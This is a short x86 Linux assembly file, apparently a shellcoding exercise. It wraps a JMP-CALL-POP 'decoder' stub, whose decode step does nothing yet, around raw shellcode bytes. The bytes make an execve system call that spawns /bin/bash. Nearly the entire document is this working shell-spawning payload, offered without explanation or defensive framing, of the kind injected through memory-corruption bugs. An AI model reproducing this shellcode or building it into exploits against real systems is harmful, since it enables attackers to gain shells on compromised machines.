global _start

section .text
   
_start:
    jmp short call_decoder
    
decoder:
    pop     esi
    
decode:
    jmp short Shellcode
    
call_decoder:
    call     decoder
    Shellcode: db 0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x62,0x69,0x6e,0x2f,0x68,0x2f,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0x31,0xc0,0x83,0xc0,0x0b,0xcd,0x80,0x31,0xc0,0x90